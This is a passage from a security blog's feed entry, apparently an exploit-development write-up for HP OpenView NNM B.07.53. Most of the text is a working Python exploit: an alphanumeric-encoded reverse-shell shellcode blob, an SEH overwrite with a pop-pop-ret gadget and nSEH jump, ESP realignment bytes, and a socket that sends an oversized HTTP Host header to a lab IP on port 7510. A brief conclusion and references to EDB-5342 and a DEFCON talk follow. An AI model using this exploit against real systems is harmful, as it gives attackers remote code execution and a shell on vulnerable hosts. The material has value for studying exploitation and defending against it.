class="se">\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x63\x24\x25\x2d\x55\x63\x24\x25\x2d\x57\x63\x26\x25\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x30\x31\x55\x38\x2d\x30\x31\x55\x38\x2d\x31\x33\x55\x3c\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x6c\x3d\x4e\x2e\x2d\x6c\x3d\x4e\x2e\x2d\x6d\x3d\x50\x31\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x57\x5f\x2c\x53\x2d\x57\x5f\x2c\x53\x2d\x57\x60\x31\x54\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x53\x2b\x51\x2a\x2d\x53\x2b\x51\x2a\x2d\x54\x2d\x53\x2b\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x21\x55\x63\x3e\x2d\x21\x55\x63\x3e\x2d\x21\x56\x63\x46\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x32\x73\x23\x6b\x2d\x32\x73\x23\x6b\x2d\x34\x73\x23\x6c\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x5a\x6d\x74\x38\x2d\x5a\x6d\x74\x38\x2d\x5c\x6f\x74\x38\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x35\x55\x63\x6b\x2d\x35\x55\x63\x6b\x2d\x36\x56\x63\x6d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x32\x52\x28\x4b\x2d\x32\x52\x28\x4b\x2d\x34\x53\x28\x4c\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x37\x3c\x55\x44\x2d\x37\x3c\x55\x44\x2d\x3c\x41\x56\x46\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x63\x27\x5f\x39\x2d\x63\x27\x5f\x39\x2d\x65\x27\x61\x3e\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x66\x3e\x28\x55\x2d\x66\x3e\x28\x55\x2d\x68\x43\x29\x56\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x39\x38\x32\x2c\x2d\x39\x38\x32\x2c\x2d\x3b\x39\x33\x2e\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x37\x3b\x38\x38\x2d\x37\x3b\x38\x38\x2d\x3c\x3b\x39\x39\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x37\x38\x38\x3c\x2d\x37\x38\x38\x3c\x2d\x3c\x39\x39\x41\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x3d\x39\x39\x2d\x55\x3d\x39\x39\x2d\x56\x41\x39\x3d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x3d\x49\x4f\x68\x2d\x3d\x49\x4f\x68\x2d\x42\x49\x51\x69\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x41\x54\x54\x26\x2d\x41\x54\x54\x26\x2d\x42\x56\x56\x26\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x33\x68\x3e\x49\x2d\x33\x68\x3e\x49\x2d\x34\x68\x3e\x49\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x37\x38\x5f\x55\x2d\x37\x38\x5f\x55\x2d\x39\x39\x5f\x57\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x45\x58\x31\x4f\x2d\x45\x58\x31\x4f\x2d\x45\x59\x32\x4f\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x5f\x37\x38\x38\x2d\x5f\x37\x38\x38\x2d\x5f\x39\x38\x38\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x31\x33\x55\x27\x2d\x31\x33\x55\x27\x2d\x31\x35\x55\x28\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x63\x32\x34\x2d\x55\x63\x32\x34\x2d\x57\x63\x32\x34\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x22\x73\x2e\x34\x2d\x22\x73\x2e\x34\x2d\x23\x74\x2e\x36\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x50\x38\x38\x32\x2d\x50\x38\x38\x32\x2d\x50\x39\x38\x33\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x36\x27\x5d\x31\x2d\x36\x27\x5d\x31\x2d\x38\x28\x5f\x32\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x32\x54\x55\x4f\x2d\x32\x54\x55\x4f\x2d\x34\x55\x55\x50\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x71\x4f\x5d\x23\x2d\x71\x4f\x5d\x23\x2d\x72\x50\x5d\x23\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x63\x27\x68\x32\x2d\x63\x27\x68\x32\x2d\x65\x27\x68\x32\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x50\x60\x5f\x55\x2d\x50\x60\x5f\x55\x2d\x51\x60\x60\x55\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x3e\x39\x32\x5c\x2d\x3e\x39\x32\x5c\x2d\x44\x3d\x33\x5d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x39\x39\x3e\x39\x2d\x39\x39\x3e\x39\x2d\x3e\x3d\x43\x3d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x63\x39\x39\x2d\x55\x63\x39\x39\x2d\x57\x63\x3c\x3d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x47\x2a\x31\x55\x2d\x47\x2a\x31\x55\x2d\x49\x2b\x32\x55\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x69\x37\x39\x32\x2d\x69\x37\x39\x32\x2d\x6a\x3c\x3d\x33\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x55\x55\x47\x2d\x55\x55\x55\x47\x2d\x55\x55\x55\x48\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x63\x6c\x24\x2d\x55\x63\x6c\x24\x2d\x57\x63\x6e\x26\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x3c\x2d\x48\x52\x2d\x3c\x2d\x48\x52\x2d\x3c\x2e\x49\x54\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x44\x35\x39\x32\x2d\x44\x35\x39\x32\x2d\x46\x36\x39\x33\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x32\x2d\x2e\x2d\x55\x32\x2d\x2e\x2d\x56\x33\x2e\x30\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x32\x44\x44\x55\x2d\x32\x44\x44\x55\x2d\x34\x44\x45\x55\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x4f\x5c\x28\x36\x2d\x4f\x5c\x28\x36\x2d\x50\x5c\x28\x36\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x38\x35\x37\x26\x2d\x38\x35\x37\x26\x2d\x38\x36\x37\x28\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x37\x39\x55\x5f\x2d\x37\x39\x55\x5f\x2d\x38\x3c\x56\x60\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x37\x36\x34\x37\x2d\x37\x36\x34\x37\x2d\x37\x38\x36\x38\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x27\x3d\x49\x49\x2d\x27\x3d\x49\x49\x2d\x29\x41\x49\x49\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x54\x26\x54\x65\x2d\x54\x26\x54\x65\x2d\x54\x28\x56\x65\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x4c\x54\x64\x26\x2d\x4c\x54\x64\x26\x2d\x4c\x56\x64\x27\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x51\x3c\x26\x37\x2d\x51\x3c\x26\x37\x2d\x52\x3c\x28\x39\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x64\x32\x26\x2d\x55\x64\x32\x26\x2d\x55\x64\x34\x28\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x38\x26\x37\x49\x2d\x38\x26\x37\x49\x2d\x38\x28\x39\x49\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x2b\x49\x2e\x5f\x2d\x2b\x49\x2e\x5f\x2d\x2d\x49\x2e\x5f\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x54\x2b\x57\x41\x2d\x54\x2b\x57\x41\x2d\x55\x2c\x59\x41\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x42\x5f\x2c\x59\x2d\x42\x5f\x2c\x59\x2d\x44\x61\x31\x59\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x65\x50\x54\x68\x2d\x65\x50\x54\x68\x2d\x67\x51\x56\x68\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x45\x6a\x70\x69\x2d\x45\x6a\x70\x69\x2d\x45\x6b\x72\x6b\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x63\x44\x55\x2d\x55\x63\x44\x55\x2d\x55\x63\x45\x56\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x3d\x26\x43\x26\x2d\x3d\x26\x43\x26\x2d\x3d\x28\x45\x28\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x64\x5e\x3e\x2d\x55\x64\x5e\x3e\x2d\x55\x64\x5f\x46\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x4d\x26\x37\x4a\x2d\x4d\x26\x37\x4a\x2d\x4e\x28\x39\x4b\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x65\x39\x26\x3d\x2d\x65\x39\x26\x3d\x2d\x66\x3c\x28\x3d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x6a\x2e\x3c\x54\x2d\x6a\x2e\x3c\x54\x2d\x6c\x2e\x3d\x56\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x27\x3e\x2d\x28\x2d\x27\x3e\x2d\x28\x2d\x27\x43\x2d\x2a\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x3e\x41\x54\x65\x2d\x3e\x41\x54\x65\x2d\x42\x41\x56\x65\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x27\x39\x4f\x26\x2d\x27\x39\x4f\x26\x2d\x27\x3b\x51\x28\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x5f\x5a\x38\x38\x2d\x5f\x5a\x38\x38\x2d\x60\x5a\x3c\x38\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x65\x50\x54\x68\x2d\x65\x50\x54\x68\x2d\x67\x51\x56\x68\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x54\x46\x4a\x6a\x2d\x54\x46\x4a\x6a\x2d\x56\x47\x4b\x6a\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x71\x3e\x34\x2b\x2d\x71\x3e\x34\x2b\x2d\x72\x46\x36\x2d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x45\x55\x44\x6a\x2d\x45\x55\x44\x6a\x2d\x45\x56\x45\x6b\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x50\x6d\x3c\x48\x2d\x50\x6d\x3c\x48\x2d\x51\x6e\x3c\x49\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x4e\x26\x2e\x47\x2d\x4e\x26\x2e\x47\x2d\x50\x28\x31\x49\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x39\x51\x26\x39\x2d\x39\x51\x26\x39\x2d\x3c\x51\x28\x3b\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x27\x39\x45\x26\x2d\x27\x39\x45\x26\x2d\x27\x3b\x45\x28\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x5e\x44\x64\x33\x2d\x5e\x44\x64\x33\x2d\x5f\x45\x65\x34\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x55\x35\x27\x2d\x55\x55\x35\x27\x2d\x56\x55\x35\x28\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x56\x5c\x27\x55\x2d\x56\x5c\x27\x55\x2d\x58\x5e\x27\x55\x50</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">final</span> <span class="o">=</span> <span class="n">finalPayload_esp</span> <span class="o">+</span> <span class="n">rev_shell_payload</span>
</span><span class='line'>
</span><span class='line'><span class="n">egg_marker</span> <span class="o">=</span> <span class="s">&quot;T00WT00W&quot;</span>
</span><span class='line'><span class="n">buff_initial</span> <span class="o">=</span> <span class="s">&quot;AAAA&quot;</span> <span class="o">+</span> <span class="n">egg_marker</span> <span class="o">+</span> <span class="n">final</span> <span class="o">+</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">3293</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">final</span><span class="p">))</span>
</span><span class='line'><span class="c"># buff_initial = &quot;A&quot; * 3305</span>
</span><span class='line'>
</span><span class='line'><span class="c"># 1035FE34   48               DEC EAX</span>
</span><span class='line'><span class="c"># 1035FE35   48               DEC EAX</span>
</span><span class='line'><span class="c"># 1035FE36   77 04            JA SHORT 1035FE59</span>
</span><span class='line'><span class="c"># little edian format: &quot;\x4c\x4c\x77\x04&quot;  ==&gt; bad char friendly</span>
</span><span class='line'><span class="n">nseh</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x48\x48\x77\x04</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># 0x6d6e394a : pop ecx # pop ecx # ret 0x08 | asciiprint,ascii,alphanum {PAGE_EXECUTE_READ} [jvm.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v5.0.140.3 (C:\Program Files\HP OpenView\jre\jreActive\bin\client\jvm.dll)</span>
</span><span class='line'><span class="n">seh</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x4a\x39\x6e\x6d</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># setting up ESP dynamically bypassing ASLR protection</span>
</span><span class='line'><span class="c"># 2216FDF0   58               POP EAX</span>
</span><span class='line'><span class="c"># 2216FDF8   66:05 2C01       ADD AX,12C</span>
</span><span class='line'><span class="c"># 2216FDF6   50               PUSH EAX</span>
</span><span class='line'><span class="c"># 2216FDF7   5C               POP ESP</span>
</span><span class='line'>
</span><span class='line'><span class="n">espSetUp</span> <span class="o">=</span> <span class="p">(</span><span class="s">&quot;</span><span class="se">\x58\x66\x05\x2c\x01\x50\x5c</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">alphaNumEncoding</span> <span class="o">=</span> <span class="p">(</span><span class="s">&quot;</span><span class="se">\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x2d\x5d\x55\x5d\x2d\x2d\x5d\x55\x5d\x2d\x31\x5e\x55\x5d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x70\x2c\x5c\x6f\x2d\x70\x2c\x5c\x6f\x2d\x71\x31\x5d\x71\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x45\x38\x26\x57\x2d\x45\x38\x26\x57\x2d\x46\x38\x28\x57\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x5b\x6c\x37\x45\x2d\x5b\x6c\x37\x45\x2d\x5b\x6e\x3c\x45\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x41\x53\x37\x2d\x2d\x41\x53\x37\x2d\x2d\x42\x54\x37\x31\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x54\x37\x66\x45\x2d\x54\x37\x66\x45\x2d\x56\x39\x66\x46\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x50\x3e\x39\x31\x2d\x50\x3e\x39\x31\x2d\x51\x41\x3b\x33\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x33\x2a\x67\x55\x2d\x33\x2a\x67\x55\x2d\x34\x2a\x67\x55\x50</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Replaced the &quot;D&quot; buffer with &quot;A&quot; buffer to protect from ESP corruption</span>
</span><span class='line'><span class="n">buff_last</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">total_len</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">buff_initial</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">nseh</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">seh</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">espSetUp</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">alphaNumEncoding</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">crash</span> <span class="o">=</span> <span class="n">buff_initial</span> <span class="o">+</span> <span class="n">nseh</span> <span class="o">+</span> <span class="n">seh</span> <span class="o">+</span> <span class="n">espSetUp</span> <span class="o">+</span> <span class="n">alphaNumEncoding</span> <span class="o">+</span> <span class="n">buff_last</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">=</span> <span class="s">&quot;GET /topology/homeBaseView HTTP/1.1</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;Host: &quot;</span> <span class="o">+</span> <span class="n">crash</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;Content-Type: application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;Content-Length: 1048580</span><span class="se">\r\n\r\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[*] Sending evil HTTP request to HP NNM -B.07.53, buffer length: &quot;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">crash</span><span class="p">)</span>
</span><span class='line'><span class="n">expl</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span> <span class="p">)</span>
</span><span class='line'><span class="n">expl</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&quot;172.16.232.178&quot;</span><span class="p">,</span> <span class="mi">7510</span><span class="p">))</span>
</span><span class='line'><span class="n">expl</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span>
</span><span class='line'><span class="n">expl</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://greyshell.github.io/downloads/code/2016/11/hpnnm-B.07.53/shell.png" alt="shell" /></p>

<h2>Conclusion</h2>

<p>At the end of my journey, I found my final exploit code was turned out entirely different from <strong><em>muts</em></strong>. The reason was, in this <code>B.07.53</code> release, application validates the length of <code>POST</code> data. So I figured out another way to deliver the payload.</p>

<h2>References</h2>

<ul>
<li><a href="https://www.exploit-db.com/exploits/5342/">EDB-ID #5342</a>: <em>HP OpenView NNM 7.5.1 - OVAS.exe SEH PRE AUTH Overflow Exploit</em></li>
<li>DEFCON #16: <em>BackTrack Foo - From bug to 0day by Mati Aharoni</em></li>
</ul>


<p><a href="https://www.youtube.com/watch?v=gHISpAZiAm0"><img src="http://img.youtube.com/vi/gHISpAZiAm0/0.jpg" alt="DEFCON #16 talk on YouTube" /></a></p>
]]></content>
  </entry>
  
</feed>
